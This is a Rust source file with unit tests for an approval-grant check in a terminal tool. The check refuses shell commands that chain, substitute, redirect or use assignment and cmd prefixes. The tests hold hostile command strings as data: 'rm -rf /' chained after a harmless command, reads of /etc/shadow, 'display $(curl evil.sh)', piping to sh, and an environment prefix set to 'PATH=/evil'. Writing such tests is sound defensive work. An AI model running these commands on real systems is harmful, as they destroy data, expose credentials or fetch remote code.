//! Approval GRANTS — the rule that lets an approved command family run without
//! asking again (design beat 3, the §D1 "capability scope" idea).
//!
//! ## What this is, and why it is not §D1's risk classification
//!
//! The control-path proposal (§D1) proposed approving by RISK LEVEL: read-only
//! allowed, writes need approval, destructive per-instance. That design needs a
//! classifier for arbitrary shell text, and this crate has no such knowledge
//! (measured: zero risk/readonly/destructive logic anywhere in the terminal
//! plugin). Inventing one is the wrong trade for a SAFETY gate, because its
//! errors are asymmetric: a write misclassified as a read does not ask, and the
//! operator never learns the gate was bypassed.
//!
//! So the grant is derived from what the operator ACTUALLY SAW AND APPROVED. The
//! server reads the first word of the pending command — a command the operator
//! had on screen — and offers to allow that word from then on. Nothing is
//! guessed about what a command does; only about what it is CALLED, and even
//! that is bounded by the rules below.
//!
//! The cost is stated rather than hidden: granting `git` from `git status` also
//! covers `git push --force`. That is why the UI shows the exact word, why
//! grants are listed, revocable and cleared when the gate is disarmed, and why
//! the whole feature is opt-in per session.
//!
//! ## The two rules, both pure and both pinned
//!
//! 1. **Only a SIMPLE command is grantable or matchable.** A command containing
//!    any shell metacharacter is never covered by a grant, because those are
//!    exactly the constructs that let a command do something other than what its
//!    first word suggests. `display version && rm -rf /` starts with `display `
//!    and must NOT ride a `display` grant. This is the injection hole that makes
//!    naive prefix matching dangerous.
//! 2. **A grant matches on the WHOLE first word.** `git` matches `git status`
//!    and `git-push` does not.

/// Characters that make a command NOT a simple command.
///
/// Deliberately broad — this is a safety gate, so anything whose meaning depends
/// on shell parsing is refused rather than reasoned about:
///
/// * `;` `&` `|` newline — separators: a second command rides the first;
/// * `` ` `` `$` — substitution: the executed text is not the text on screen;
/// * `<` `>` — redirection: can truncate or overwrite a file;
/// * `(` `)` `{` `}` — grouping and subshells;
/// * `"` `'` `\` — quoting: can hide any of the above from a prefix check;
/// * `*` `?` `[` `]` — globs: widen which files the command touches;
/// * `!` `#` — history expansion and comments: trailing text is not what it
///   looks like;
/// * `~` — home expansion.
///
/// And the two the list was missing because it was written POSIX-FIRST, on a
/// product whose terminal is most often a Windows one (measured: `infer_shell`
/// defaults to PowerShell, and cmd is a supported target):
///
/// * `%` — cmd's substitution, but ONLY in the first word (see the narrow check
///   below, the same shape as `=`): `%COMSPEC% /c del x` is grantable today and
///   its first word expands to a program the word does not name, which is the
///   exact property this file claims to keep. A `%` in a LATER word cannot change
///   which program runs — `git log --format=%H` must stay grantable — so it is
///   not in the list;
/// * `^` — cmd's escape character, which builds a command line whose text is not
///   what the shell reads. This file's policy is to refuse rather than reason
///   about such constructs.
///
/// The cost is real and accepted: a legitimate command using any of these asks
/// every time. Asking is the safe direction.
const UNSAFE: &[char] = &[
    ';', '&', '|', '\n', '\r', '`', '$', '<', '>', '(', ')', '{', '}', '"', '\'', '\\', '*', '?',
    '[', ']', '!', '#', '~', '^',
];

/// Whether a command is simple enough for a grant to be meaningful.
///
/// `true` means: the first word is the whole story about what program runs, and
/// nothing in the string can chain, substitute, redirect or glob.
pub fn is_simple_command(cmd: &str) -> bool {
    let t = cmd.trim();
    if t.is_empty() || t.chars().any(|c| UNSAFE.contains(&c)) {
        return false;
    }
    // B2 (round 170): an environment-assignment prefix (`PATH=/evil ls`) makes the
    // first word an ASSIGNMENT, not a program — so a grant derived from it is the
    // prefix string, and `grant_matches("PATH=/evil", "PATH=/evil rm -rf /")` was
    // true: one approval silently covered every later command sharing that prefix.
    // The property documented above ("the first word is the whole story about what
    // program runs") is exactly what this rejects.
    //
    // `=` is deliberately NOT added to UNSAFE: an `=` in a LATER word
    // (`git log --format=%H`, `curl -d a=b`) cannot change which program runs, and
    // banning it there would make ordinary commands ask every time for no safety
    // gained. The narrow check encodes the property instead of approximating it.
    let first = t.split_whitespace().next().unwrap_or("");
    if first.contains('=') || first.contains('%') {
        return false;
    }
    // AND THE FIRST WORD MUST NAME A PROGRAM. The rule above says "the first word
    // is the whole story about what program runs"; that is false when the word is
    // pure punctuation. Measured: `. ./deploy.sh` is grantable as `.` — dot-sourcing
    // an arbitrary script under a word that says nothing — and `.` has no character
    // a shell could not also spell as a separator. Requiring one alphanumeric keeps
    // `./deploy.sh`, `ls`, `git` and `C:\\tools\\x.exe` and refuses `.`, `..`, `/`
    // and `:`.
    first.chars().any(|c| c.is_alphanumeric())
}

/// The grant a command would create: its first whitespace-separated word.
///
/// `None` when the command is not simple — a grant derived from it would cover
/// commands that only LOOK like it.
pub fn grant_for(cmd: &str) -> Option<String> {
    if !is_simple_command(cmd) {
        return None;
    }
    // `split_whitespace` already skips leading and trailing whitespace, so the
    // `trim()` clippy would flag here is genuinely redundant.
    cmd.split_whitespace()
        .next()
        .map(|w| w.to_string())
        .filter(|w| !w.is_empty())
}

/// Whether an existing grant covers this command.
///
/// Both sides must be simple: the stored grant (paranoia about a hand-edited
/// state file or a future caller) and the command about to run.
pub fn grant_matches(grant: &str, cmd: &str) -> bool {
    if !is_simple_command(grant) || !is_simple_command(cmd) {
        return false;
    }
    cmd.split_whitespace().next() == grant.split_whitespace().next()
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn a_grant_is_the_first_word() {
        assert_eq!(grant_for("display version").as_deref(), Some("display"));
        assert_eq!(
            grant_for("display ont info 0 1").as_deref(),
            Some("display")
        );
        assert_eq!(grant_for("ls").as_deref(), Some("ls"));
        assert_eq!(grant_for("  git   status  ").as_deref(), Some("git"));
        assert_eq!(
            grant_for("./deploy.sh --prod").as_deref(),
            Some("./deploy.sh")
        );
    }

    #[test]
    fn nothing_that_the_shell_will_reinterpret_is_grantable() {
        // THE security property. Every one of these starts with a word someone
        // might otherwise have granted, and every one of them does something a
        // prefix check cannot see.
        for cmd in [
            "display version && rm -rf /",
            "display version; rm -rf /",
            "display version | tee /etc/passwd",
            "display $(cat /etc/shadow)",
            "display `id`",
            "display version > /etc/hosts",
            "display *",
            "display ~/secret",
            "display version # && rm -rf /",
            "display \"version\"",
            "display version\nrm -rf /",
            "display version &",
        ] {
            assert_eq!(
                grant_for(cmd),
                None,
                "{cmd:?} must NOT be grantable: its first word does not describe \
                 what it will do"
            );
        }
    }

    #[test]
    fn a_grant_never_covers_a_command_that_chains() {
        // The hole a prefix check alone would leave: this STARTS with "display"
        // and must still be refused.
        assert!(!grant_matches("display", "display version && rm -rf /"));
        assert!(!grant_matches("display", "display version; rm -rf /"));
        assert!(!grant_matches("display", "display version | sh"));
        assert!(!grant_matches("display", "display $(curl evil.sh)"));
    }

    #[test]
    fn a_grant_matches_the_same_family_and_nothing_else() {
        assert!(grant_matches("display", "display version"));
        assert!(grant_matches("display", "display ont info 0 1"));
        assert!(grant_matches("display", "  display   version  "));
        // A different first word is a different program.
        assert!(!grant_matches("display", "show version"));
        // ...and a word that merely STARTS with the grant is not the same word:
        // "git-push" is not "git".
        assert!(!grant_matches("git", "git-push --force"));
        assert!(!grant_matches("display", "displayx version"));
    }

    #[test]
    fn an_empty_or_blank_command_is_never_simple() {
        assert!(!is_simple_command(""));
        assert!(!is_simple_command("   "));
        assert_eq!(grant_for(""), None);
        assert_eq!(grant_for("   "), None);
    }

    #[test]
    fn ordinary_operator_commands_remain_grantable() {
        // The other half of the trade: the rules must not be so strict that the
        // feature is useless on real device commands. These all appear in this
        // repo's own docs and tests.
        for cmd in [
            "display version",
            "display ont info 0 1",
            "display interface gpon-olt_1/2/3",
            "show gpon onu state gpon-olt_1/2/3",
            "ls -la /var/log",
            "systemctl status nginx",
            "ping -c 4 8.8.8.8",
            "Get-Process",
            "git status --short",
        ] {
            assert!(
                grant_for(cmd).is_some(),
                "{cmd:?} should be grantable — over-strictness makes the gate \
                 useless on the commands it exists for"
            );
        }
    }

    #[test]
    fn a_grant_is_stable_across_repeats() {
        // Idempotence matters because the panel may re-derive it on every poll.
        let g = grant_for("display version").unwrap();
        assert_eq!(grant_for("display version").as_deref(), Some(g.as_str()));
        assert_eq!(
            grant_for(&format!("display {}", "x".repeat(500))).as_deref(),
            Some("display")
        );
    }

    #[test]
    fn an_assignment_prefix_is_never_a_grant() {
        // B2: the first word is an ASSIGNMENT, not a program. Pre-fix this was
        // "simple", the grant was the literal prefix, and the second call was true.
        assert!(!is_simple_command("PATH=/evil ls"));
        assert_eq!(grant_for("PATH=/evil ls"), None);
        assert!(!grant_matches("PATH=/evil", "PATH=/evil rm -rf /"));
        assert!(!grant_matches("PATH=/evil ls", "PATH=/evil rm -rf /"));
    }

    /// THE CROSS-CHECK the module's doc promised and nothing provided.
    ///
    /// `grant_for` decides on the device; `firstWord` in ApprovalGate.tsx decides whether the panel
    /// OFFERS the control and what to label it. Two implementations, two languages — and they had
    /// already drifted: the panel still offered `PATH=/evil` as a grant after this file started
    /// refusing it, and it offered `.` for `. ./deploy.sh` where this file refuses pure punctuation.
    /// A divergence cannot widen a permission (the device derives the grant it will honour), but it
    /// makes the UI promise something the device will not do — a control that lies.
    ///
    /// Both sides now read ONE fixture, so a rule change that touches only one of them fails here
    /// or in the panel's suite.
    #[test]
    fn the_panel_mirror_and_the_device_agree_on_every_fixture_case() {
        let raw = include_str!("../../../tests/fixtures/approval-grants.json");
        let parsed: serde_json::Value =
            serde_json::from_str(raw).expect("the shared fixture parses");
        let cases = parsed["cases"].as_array().expect("cases");
        assert!(cases.len() >= 25, "the fixture must stay substantive");
        let mut checked = 0;
        for c in cases {
            let cmd = c["cmd"].as_str().expect("cmd");
            let want = c["grant"].as_str();
            let why = c["why"].as_str().unwrap_or("");
            match want {
                Some(word) => assert_eq!(
                    grant_for(cmd).as_deref(),
                    Some(word),
                    "{cmd:?} must be grantable as {word:?} ({why})"
                ),
                None => assert_eq!(
                    grant_for(cmd),
                    None,
                    "{cmd:?} must NOT be grantable ({why})"
                ),
            }
            checked += 1;
        }
        assert_eq!(checked, cases.len());
    }

    #[test]
    fn cmd_substitution_in_the_first_word_is_never_grantable() {
        // WINDOWS FIRST. This list was written POSIX-first: `$` and backtick were refused while
        // cmd's own substitution was not, so `%COMSPEC% /c del x` was grantable as `%COMSPEC%` — a
        // word that expands to a program it does not name, which is the one property this module
        // promises to keep. `^` is refused everywhere (cmd's escape builds a line whose text is not
        // what the shell reads); `%` only in the FIRST word, for the same reason `=` is.
        assert_eq!(grant_for("%COMSPEC% /c del x"), None);
        assert_eq!(grant_for("%TEMP%/tool.exe --go"), None);
        assert!(!is_simple_command("%COMSPEC% /c dir"));
        assert_eq!(
            grant_for("echo ^hello"),
            None,
            "^ is cmd's escape character"
        );
        // The counterweight, unchanged: a `%` in a LATER word cannot change which program runs.
        assert!(is_simple_command("git log --format=%H"));
        assert_eq!(grant_for("echo %USERPROFILE%").as_deref(), Some("echo"));
    }

    #[test]
    fn the_first_word_must_name_a_program() {
        // The rule "the first word is the whole story about what program runs" is false when that
        // word is pure punctuation: `. ./deploy.sh` was grantable as `.` — dot-sourcing an arbitrary
        // script under a word that says nothing. One alphanumeric keeps every real program name.
        assert_eq!(grant_for(". ./deploy.sh"), None);
        assert_eq!(grant_for(".. /etc/passwd"), None);
        assert_eq!(grant_for("/ ./x"), None);
        assert_eq!(grant_for(": :"), None);
        // ...and does not touch the ordinary ones.
        assert_eq!(
            grant_for("./deploy.sh --prod").as_deref(),
            Some("./deploy.sh")
        );
        assert_eq!(grant_for("ls -la").as_deref(), Some("ls"));
        assert_eq!(
            grant_for("C:/tools/x.exe -v").as_deref(),
            Some("C:/tools/x.exe")
        );
    }

    #[test]
    fn an_equals_in_a_later_word_stays_grantable() {
        // The counterweight: refusing `=` ANYWHERE would break these, and an `=`
        // after the program name cannot change which program runs.
        assert!(is_simple_command("git log --format=%H"));
        assert_eq!(grant_for("git log --format=%H").as_deref(), Some("git"));
        assert!(is_simple_command("curl -d a=b"));
        assert_eq!(grant_for("curl -d a=b").as_deref(), Some("curl"));
    }
}
